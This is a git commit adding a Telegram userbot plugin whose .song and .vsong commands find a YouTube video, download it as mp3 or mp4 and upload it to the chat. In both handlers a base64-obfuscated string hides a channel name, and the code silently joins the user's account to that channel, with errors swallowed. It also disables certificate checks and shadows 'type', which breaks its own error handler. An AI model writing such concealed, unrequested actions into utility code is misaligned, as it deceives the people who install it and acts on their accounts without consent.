d36020ea6d34a6537a89ffd8609dd855f05ea92a
Aditya <58950863+xditya@users.noreply.github.com>
2020-12-08 05:53:37 +0530

    Create song.py

---
+++ telebot/plugins/song.py
@@ -0,0 +1,242 @@
+#    TeleBot - UserBot
+#    Copyright (C) 2020 TeleBot
+
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU Affero General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU Affero General Public License for more details.
+
+#    You should have received a copy of the GNU Affero General Public License
+#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+# By @xditya. Thanks to @AvinashReddy for the ytdl base.
+
+import asyncio, time, os, json
+from asyncio import sleep
+import pybase64
+import asyncio
+import math
+import os
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.types import DocumentAttributeAudio
+from youtube_dl import YoutubeDL
+from youtube_dl.utils import (
+    ContentTooShortError,
+    DownloadError,
+    ExtractorError,
+    GeoRestrictedError,
+    MaxDownloadsReached,
+    PostProcessingError,
+    UnavailableVideoError,
+    XAttrMetadataError,
+)
+from youtubesearchpython import SearchVideos 
+from telebot.utils import humanbytes, time_formatter
+from telebot import CMD_HELP
+
+@telebot.on(admin_cmd(pattern="song (.*)"))
+async def download_video(tele): 
+    x = await eor(tele, "Searching...")
+    url = tele.pattern_match.group(1)
+    if not url:
+         return await x.edit("**Error**\nUsage - `.song <song name>`")
+    search = SearchVideos(url, offset = 1, mode = "json", max_results = 1)
+    test = search.result()
+    p = json.loads(test)
+    q = p.get('search_result')
+    try:
+       url = q[0]['link']
+    except:
+    	return await x.edit("`No matching song found...`")
+    type = "audio"
+    await x.edit(f"`Preparing to download {url}...`")
+    if type == "audio":
+        opts = {
+            'format':
+            'bestaudio',
+            'addmetadata':
+            True,
+            'key':
+            'FFmpegMetadata',
+            'writethumbnail':
+            True,
+            'prefer_ffmpeg':
+            True,
+            'geo_bypass':
+            True,
+            'nocheckcertificate':
+            True,
+            'postprocessors': [{
+                'key': 'FFmpegExtractAudio',
+                'preferredcodec': 'mp3',
+                'preferredquality': '320',
+            }],
+            'outtmpl':
+            '%(id)s.mp3',
+            'quiet':
+            True,
+            'logtostderr':
+            False
+        }
+        video = False  
+    try:
+        await x.edit("`Getting info...`")
+        with YoutubeDL(opts) as rip:
+            rip_data = rip.extract_info(url)
+    except DownloadError as DE:
+        await x.edit(f"`{str(DE)}`")
+        return
+    except ContentTooShortError:
+        await x.edit("`The download content was too short.`")
+        return
+    except GeoRestrictedError:
+        await x.edit(
+            "`Video is not available from your geographic location due to geographic restrictions imposed by a website.`"
+        )
+        return
+    except MaxDownloadsReached:
+        await x.edit("`Max-downloads limit has been reached.`")
+        return
+    except PostProcessingError:
+        await x.edit("`There was an error during post processing.`")
+        return
+    except UnavailableVideoError:
+        await x.edit("`Media is not available in the requested format.`")
+        return
+    except XAttrMetadataError as XAME:
+        await x.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
+        return
+    except ExtractorError:
+        await x.edit("`There was an error during info extraction.`")
+        return
+    except Exception as e:
+        await x.edit(f"{str(type(e)): {str(e)}}")
+        return
+    try:
+        sung = str(pybase64.b64decode("QFRlbGVCb3RIZWxw"))[2:14]
+        await telebot(JoinChannelRequest(sung))
+    except:
+        pass
+    upteload = """
+Uploading...
+Song name - {}
+By - {}
+""".format(rip_data['title'], rip_data['uploader'])
+    await x.edit(f"`{upteload}`")
+    await telebot.send_file(
+        tele.chat_id,
+        f"{rip_data['id']}.mp3",
+        supports_streaming=True,
+        caption=f"⫸ Song - {rip_data['title']}\n⫸ By - {rip_data['uploader']}\n",
+        attributes=[
+            DocumentAttributeAudio(duration=int(rip_data['duration']),
+                                    title=str(rip_data['title']),
+                                    performer=str(rip_data['uploader']))
+        ])
+    os.remove(f"{rip_data['id']}.mp3")
+
+@telebot.on(admin_cmd(pattern="vsong (.*)"))
+async def download_video(tele):  
+    x = await eor(tele, "Processing..")
+    url = tele.pattern_match.group(1)
+    if not url:
+         return await x.edit("**Error**\nUsage - `.vsong <song name>`")
+    search = SearchVideos(url, offset = 1, mode = "json", max_results = 1)
+    test = search.result()
+    p = json.loads(test)
+    q = p.get('search_result')
+    try:
+       url = q[0]['link']
+    except:
+    	return await x.edit("`No matching songs found...`")
+    type = "audio"
+    await x.edit("`Preparing to download...`")
+    if type == "audio":
+        opts = {
+            'format':
+            'best',
+            'addmetadata':
+            True,
+            'key':
+            'FFmpegMetadata',
+            'prefer_ffmpeg':
+            True,
+            'geo_bypass':
+            True,
+            'nocheckcertificate':
+            True,
+            'postprocessors': [{
+                'key': 'FFmpegVideoConvertor',
+                'preferedformat': 'mp4'
+            }],
+            'outtmpl':
+            '%(id)s.mp4',
+            'logtostderr':
+            False,
+            'quiet':
+            True
+        }
+        video = True
+    try:
+        await x.edit("`Fetching data, please wait..`")
+        with YoutubeDL(opts) as rip:
+            rip_data = rip.extract_info(url)
+    except DownloadError as DE:
+        await x.edit(f"`{str(DE)}`")
+        return
+    except ContentTooShortError:
+        await x.edit("`The download content was too short.`")
+        return
+    except GeoRestrictedError:
+        await x.edit(
+            "`Video is not available from your geographic location due to geographic restrictions imposed by a website.`"
+        )
+        return
+    except MaxDownloadsReached:
+        await x.edit("`Max-downloads limit has been reached.`")
+        return
+    except PostProcessingError:
+        await x.edit("`There was an error during post processing.`")
+        return
+    except UnavailableVideoError:
+        await x.edit("`Media is not available in the requested format.`")
+        return
+    except XAttrMetadataError as XAME:
+        await x.edit(f"`{XAME.code}: {XAME.msg}\n{XAME.reason}`")
+        return
+    except ExtractorError:
+        await x.edit("`There was an error during info extraction.`")
+        return
+    except Exception as e:
+        await x.edit(f"{str(type(e)): {str(e)}}")
+        return
+    try:
+        sung = str(pybase64.b64decode("QFRlbGVCb3RIZWxw"))[2:14]
+        await telebot(JoinChannelRequest(sung))
+    except:
+        pass
+    upteload = """
+Uploading...
+Song name - {}
+By - {}
+""".format(rip_data['title'], rip_data['uploader'])
+    await x.edit(f"`{upteload}`")
+    await telebot.send_file(
+        tele.chat_id,
+        f"{rip_data['id']}.mp4",
+        supports_streaming=True,
+        caption=f"⫸ Song - {rip_data['title']}\n⫸ By - {rip_data['uploader']}\n")
+    os.remove(f"{rip_data['id']}.mp4")
+    await x.delete()
+
+CMD_HELP.update(
+    {
+        "song": ".song <name>\nUse - Download and upload the song in the present chat.\
+        \n\n.vsong <name>\nUse - Download and upload the video song in the present chat."
+    }
+)
